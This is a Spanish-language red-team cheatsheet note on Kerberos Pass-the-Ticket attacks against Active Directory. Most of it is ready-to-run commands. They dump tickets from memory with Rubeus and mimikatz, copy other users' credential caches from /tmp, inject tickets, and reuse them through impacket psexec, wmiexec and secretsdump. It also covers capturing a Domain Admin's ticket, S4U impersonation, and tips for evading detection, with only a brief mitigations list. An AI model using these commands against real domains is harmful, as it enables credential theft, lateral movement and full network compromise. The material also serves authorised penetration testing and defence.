---
aliases:
  - PtT
  - Kerberos Pass-the-Ticket
  - Ticket Injection
tags:
  - type/atomic
  - technique/lateral-movement
  - technique/credential-access
  - technique/kerberos
  - env/windows
  - asset/active-directory
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
type: Atomic
linked:
  - "[[Active Directory Exploitation]]"
  - "[[Pass-the-Hash]]"
  - "[[Golden Ticket]]"
  - "[[Silver Ticket]]"
  - "[[LSASS Dumping]]"
---
# Pass-the-Ticket

***

## Cheatsheet
^pass-the-ticket

| Tool | Command |
| --- | --- |
| **Rubeus dump** | `Rubeus.exe dump /service:krbtgt /nowrap` |
| **Rubeus ptt** | `Rubeus.exe ptt /ticket:BASE64_or_file.kirbi` |
| **mimikatz dump** | `sekurlsa::tickets /export` |
| **mimikatz ptt** | `kerberos::ptt ticket.kirbi` |
| **Linux klist** | `export KRB5CCNAME=/path/ticket.ccache; klist` |
| **impacket use** | `impacket-psexec -k -no-pass user@host.dom.local` |
| **kirbi → ccache** | `impacket-ticketConverter input.kirbi output.ccache` |
| **ccache → kirbi** | `impacket-ticketConverter input.ccache output.kirbi` |

***

## Concepto

Kerberos tickets (TGT o TGS) capturados en memoria o forjados pueden inyectarse en la sesión actual → autenticarse como el owner del ticket sin necesitar password/hash.

**Variantes**:
- TGT robado → acceso a todo lo que el user puede pedir.
- TGS robado → acceso al servicio específico del ticket.
- Ticket forjado ([[Golden Ticket]] / [[Silver Ticket]]) → misma mecánica de inyección.

## Formatos

- `.kirbi` — formato nativo Windows (binario MIT-like).
- `.ccache` — formato MIT (usado por Linux / impacket).
- Base64 encoded `.kirbi` — común en output de Rubeus.

Conversion:
```bash
# kirbi → ccache
impacket-ticketConverter input.kirbi output.ccache

# ccache → kirbi
impacket-ticketConverter input.ccache output.kirbi
```

## 1. Obtener tickets

### Windows on-host (Rubeus)
```powershell
# Todos los TGTs en memoria (high-priv)
.\Rubeus.exe dump /nowrap

# Solo TGT (ticket con service krbtgt)
.\Rubeus.exe dump /service:krbtgt /nowrap

# LUID específico
.\Rubeus.exe dump /luid:0x3e7 /nowrap

# Monitor mode — captura nuevos logons
.\Rubeus.exe monitor /interval:5

# Harvest — captura + reutiliza
.\Rubeus.exe harvest /interval:30
```

Requiere admin local (`SeDebugPrivilege`) para leer tickets de otros users.

### Windows on-host (mimikatz)
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
# → .kirbi files en cwd

# Listar sin export
mimikatz # sekurlsa::tickets
```

### Linux — del target via remote
Tickets solo existen en memoria del host. Remote no es posible sin RCE + dump.

### Linux — ccache files en disco (credential caches)
```bash
# Típicos en /tmp:
ls /tmp/krb5cc_*

# Robar si tenés read access
cp /tmp/krb5cc_1000 /tmp/stolen.ccache
```

Usuarios Linux autenticados con Kerberos (SSSD/realmd joined to AD) dejan ccache en /tmp.

## 2. Inyectar tickets

### Windows (Rubeus)
```powershell
# Desde base64
.\Rubeus.exe ptt /ticket:doIFqjCCBaagAwIB...

# Desde file
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Listar tickets inyectados
klist

# Purge antes
.\Rubeus.exe purge
klist purge
```

### Windows (mimikatz)
```
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # kerberos::list
mimikatz # kerberos::purge
```

### Linux (impacket + KRB5CCNAME)
```bash
export KRB5CCNAME=/path/to/ticket.ccache
klist  # verificar

# Usar con -k -no-pass
impacket-psexec -k -no-pass dom.local/user@host.dom.local
impacket-wmiexec -k -no-pass dom.local/user@host.dom.local
impacket-smbclient -k -no-pass dom.local/user@host.dom.local
impacket-secretsdump -k -no-pass -just-dc dom.local/user@dc.dom.local
```

## 3. Use cases comunes

### Reutilizar TGT de admin que loguea al host
```powershell
# Monitor hasta que DA interactive logon
.\Rubeus.exe monitor /interval:5 /filteruser:DomainAdmin

# Captura y usar
.\Rubeus.exe ptt /ticket:CAPTURED_BASE64
dir \\dc\c$
```

### Pivot desde Linux con ticket robado
```bash
cp /tmp/krb5cc_$(id -u) /tmp/stolen.ccache
# Exfil + usar
export KRB5CCNAME=/path/stolen.ccache
impacket-psexec -k -no-pass target.dom.local
```

### Golden/Silver ticket injection
Ver [[Golden Ticket]] / [[Silver Ticket]] — son forge + PtT.

### OverPass-the-Hash (hash → TGT → PtT)
```powershell
.\Rubeus.exe asktgt /user:admin /rc4:HASH /domain:dom.local /ptt
```

Auto-PtT con `/ptt`.

## 4. Delegation tickets (S4U)

Con ciertos privs se pueden forjar tickets a demanda (sin robar):

### Unconstrained delegation abuse
```powershell
# Capturar TGT de cualquier user que loguee al server UD-habilitado
.\Rubeus.exe monitor /interval:5 /nowrap
```

### S4U2Self + S4U2Proxy (constrained / RBCD)
```bash
impacket-getST -spn cifs/target.dom.local -impersonate administrator dom.local/svc:password
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass target.dom.local
```

## 5. Requirements para uso

- Conectividad al destino vía Kerberos (puerto 88 al DC + service port).
- **Nombre del host vía FQDN** (Kerberos no funciona con IP — salvo SPN configurado).
- DNS resolver configurado correctamente (para PTR + A records).
- Clock skew <5min entre atacante/DC/target.

### Kerberos con IP (trick)
```bash
# Editar /etc/hosts
echo "10.10.10.5 target.dom.local" >> /etc/hosts

# O usar -target-ip
impacket-psexec -k -no-pass dom.local/user@target.dom.local -target-ip 10.10.10.5
```

## 6. OpSec

### Detecciones
- **Event 4769** (TGS request) con user anómalo desde host anómalo.
- **Event 4624** Kerberos logon sin 4768 correlacionado → ticket inyectado.
- Rubeus/mimikatz patterns en EDR.
- Ticket lifetime anómalo si forjado manual.

### Tips
- Preferir Kerberos sobre NTLM para evadir NTLM-focused detections.
- Purge tickets después de uso para evitar cross-contamination.
- Monitor mode mejor que dump one-shot (no toca LSASS cada vez).
- Evitar PtT de DC$ desde non-DC host.

## 7. Mitigaciones (blue)

- **Protected Users** — cache credentials deshabilitado.
- **Credential Guard** — VSM aísla LSASS → tickets no extractables.
- **Kerberos Armoring (FAST)** — protege pre-auth.
- **Short TGT lifetime** (default 10h).
- **Monitor** 4769 anómalos.

## Recursos

- [HackTricks - Pass-the-Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket)
- [Rubeus Wiki](https://github.com/GhostPack/Rubeus)
- [The Hacker Recipes - PtT](https://www.thehacker.recipes/ad/movement/kerberos/ptt)

***
